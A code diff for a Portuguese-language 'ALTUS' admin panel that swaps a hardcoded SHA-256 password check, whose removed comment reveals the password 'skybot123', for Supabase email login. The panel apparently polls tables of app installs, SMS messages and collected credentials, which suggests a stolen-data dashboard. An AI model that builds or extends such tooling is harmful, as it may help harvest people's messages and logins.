@@ -615,10 +615,14 @@ body.modo-discreto #dot-discreto { display: block; }
       <div class="login-title">ALTUS</div>
       <div class="login-sub">Painel de administração</div>
     </div>
-    <label class="login-label">Senha de acesso</label>
+    <label class="login-label">Email</label>
+    <input id="login-email" type="email" class="login-input" placeholder="o.teu@email.com"
+      onkeydown="if(event.key==='Enter')document.getElementById('login-input').focus()"
+      style="margin-bottom:10px">
+    <label class="login-label">Senha</label>
     <input id="login-input" type="password" class="login-input" placeholder="••••••••"
-      onkeydown="if(event.key==='Enter')fazerLogin(this.value)">
-    <button class="login-btn" onclick="fazerLogin(document.getElementById('login-input').value)">Entrar</button>
+      onkeydown="if(event.key==='Enter')fazerLogin()">
+    <button class="login-btn" onclick="fazerLogin()">Entrar</button>
     <div id="login-error-msg" class="login-error"></div>
   </div>
 </div>
@@ -1785,60 +1789,125 @@ async function carregarDados() {
 }
 
 // ════════════════════════════════════════════════════════════════════════
-// LOGIN — autenticação com SHA-256 (Web Crypto API, nativa do browser)
+// LOGIN — Supabase Auth (email + password)
 // ════════════════════════════════════════════════════════════════════════
-//
-// COMO MUDAR A SENHA:
-//   1. Abre a consola do browser (F12 → Console)
-//   2. Cola isto e carrega Enter (substitui "novaSenha" pela tua senha):
-//        crypto.subtle.digest('SHA-256', new TextEncoder().encode('novaSenha'))
-//          .then(b => console.log([...new Uint8Array(b)].map(x=>x.toString(16).padStart(2,'0')).join('')))
-//   3. Copia o hash que aparecer e substitui o valor de SENHA_HASH abaixo.
-//
-// O SHA-256 é de sentido único: mesmo que alguém veja o hash no código,
-// não consegue reverter para a senha original (ao contrário do hex anterior).
-// ─────────────────────────────────────────────────────────────────────────
-const SENHA_HASH = "a0a6d705e68afff9166b6e853983e8e617c2889830d3ae3e0e8ee6c3d630fd6a";
-// ↑ SHA-256 de "skybot123" — muda para uma senha mais forte seguindo as
-//   instruções acima, e actualiza este hash.
+// A senha é verificada pelo Supabase nos servidores deles — nunca fica
+// exposta no código. Para mudar a senha: Supabase → Authentication →
+// Users → clica no teu utilizador → "Send password recovery".
+// ════════════════════════════════════════════════════════════════════════
 
-let autenticado = localStorage.getItem("nexus_auth") === "1";
+let autenticado  = false;
+let sessionToken = null; // JWT do utilizador autenticado
 
-async function sha256(str) {
-  const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(str));
-  return [...new Uint8Array(buf)].map(x => x.toString(16).padStart(2,'0')).join('');
+// Actualizar headers com o token da sessão autenticada
+function getHeaders() {
+  return {
+    "apikey":        SUPA_KEY,
+    "Authorization": "Bearer " + (sessionToken || SUPA_KEY),
+    "Content-Type":  "application/json"
+  };
 }
 
-async function fazerLogin(password) {
-  if (!password) { alert("Insere a senha!"); return; }
-  const hash = await sha256(password);
-  if (hash === SENHA_HASH) {
-    localStorage.setItem("nexus_auth","1");
+// Restaurar sessão guardada no localStorage (evita login a cada reload)
+async function restaurarSessao() {
+  const stored = localStorage.getItem("nexus_session");
+  if (!stored) return false;
+  try {
+    const { access_token, refresh_token, expires_at } = JSON.parse(stored);
+    // Se o token ainda é válido (expira daqui a mais de 60s)
+    if (expires_at && Date.now() / 1000 < expires_at - 60) {
+      sessionToken = access_token;
+      // Actualizar headers globais
+      headers.Authorization = "Bearer " + sessionToken;
+      return true;
+    }
+    // Token expirado — tentar renovar com refresh_token
+    const r = await fetch(SUPA_URL + "/auth/v1/token?grant_type=refresh_token", {
+      method: "POST",
+      headers: { "apikey": SUPA_KEY, "Content-Type": "application/json" },
+      body: JSON.stringify({ refresh_token })
+    });
+    if (r.ok) {
+      const data = await r.json();
+      sessionToken = data.access_token;
+      headers.Authorization = "Bearer " + sessionToken;
+      localStorage.setItem("nexus_session", JSON.stringify({
+        access_token:  data.access_token,
+        refresh_token: data.refresh_token,
+        expires_at:    Math.floor(Date.now()/1000) + data.expires_in
+      }));
+      return true;
+    }
+  } catch(_) {}
+  localStorage.removeItem("nexus_session");
+  return false;
+}
+
+async function fazerLogin() {
+  const email    = (document.getElementById("login-email")?.value || "").trim();
+  const password = (document.getElementById("login-input")?.value || "").trim();
+  const errEl    = document.getElementById("login-error-msg");
+
+  if (!email || !password) {
+    if (errEl) errEl.textContent = "❌ Preenche email e senha.";
+    return;
+  }
+
+  if (errEl) errEl.textContent = "A verificar...";
+
+  try {
+    const r = await fetch(SUPA_URL + "/auth/v1/token?grant_type=password", {
+      method: "POST",
+      headers: { "apikey": SUPA_KEY, "Content-Type": "application/json" },
+      body: JSON.stringify({ email, password })
+    });
+    const data = await r.json();
+
+    if (!r.ok) {
+      if (errEl) errEl.textContent = "❌ " + (data.error_description || data.msg || "Credenciais inválidas");
+      return;
+    }
+
+    // Guardar sessão para reload sem novo login
+    sessionToken = data.access_token;
+    headers.Authorization = "Bearer " + sessionToken;
+    localStorage.setItem("nexus_session", JSON.stringify({
+      access_token:  data.access_token,
+      refresh_token: data.refresh_token,
+      expires_at:    Math.floor(Date.now()/1000) + data.expires_in
+    }));
+
     autenticado = true;
     document.getElementById("login-overlay").style.display = "none";
-    carregarDados();
-  } else {
-    const el = document.getElementById("login-error-msg");
-    if (el) el.textContent = "❌ Senha inválida";
+    iniciarPainel();
+
+  } catch(e) {
+    if (errEl) errEl.textContent = "❌ Erro de ligação: " + e.message;
   }
 }
 
-function sair() { localStorage.removeItem("nexus_auth"); location.reload(); }
+async function sair() {
+  // Invalidar token no Supabase
+  if (sessionToken) {
+    fetch(SUPA_URL + "/auth/v1/logout", {
+      method: "POST",
+      headers: { "apikey": SUPA_KEY, "Authorization": "Bearer " + sessionToken }
+    }).catch(()=>{});
+  }
+  localStorage.removeItem("nexus_session");
+  location.reload();
+}
 
-// ── INICIAR ───────────────────────────────────────────────────────────
-if (!autenticado) {
-  document.getElementById("login-overlay").style.display = "flex";
-} else {
+function iniciarPainel() {
   carregarDados();
-  // Auto-actualizar a cada 60s (só dados, não re-renderiza tudo)
-  // Credenciais usam fetchAllPages para não cortar dados quando a tabela
-  // cresce além de qualquer limite fixo — o problema anterior era aqui.
+  // Auto-actualizar a cada 60s
   setInterval(async () => {
     if (!autenticado) return;
+    const h = getHeaders();
     try {
       const [r1,r3] = await Promise.all([
-        fetch(SUPA_URL+"/rest/v1/installs?select=*&order=ultimo_acesso.desc.nullslast&limit=1000",{headers}),
-        fetch(SUPA_URL+"/rest/v1/sms?select=*&order=criado_em.desc&limit=1000",{headers})
+        fetch(SUPA_URL+"/rest/v1/installs?select=*&order=ultimo_acesso.desc.nullslast&limit=1000",{headers:h}),
+        fetch(SUPA_URL+"/rest/v1/sms?select=*&order=criado_em.desc&limit=1000",{headers:h})
       ]);
       const d1=await r1.json(), d3=await r3.json();
       const d2 = await fetchAllPages(SUPA_URL+"/rest/v1/credenciais?select=*&order=id.desc");
@@ -1849,6 +1918,18 @@ if (!autenticado) {
     } catch(e){}
   }, 60000);
 }
+
+// ── INICIAR ───────────────────────────────────────────────────────────
+(async () => {
+  const sessaoValida = await restaurarSessao();
+  if (sessaoValida) {
+    autenticado = true;
+    document.getElementById("login-overlay").style.display = "none";
+    iniciarPainel();
+  } else {
+    document.getElementById("login-overlay").style.display = "flex";
+  }
+})();
 </script>
 
 <script>
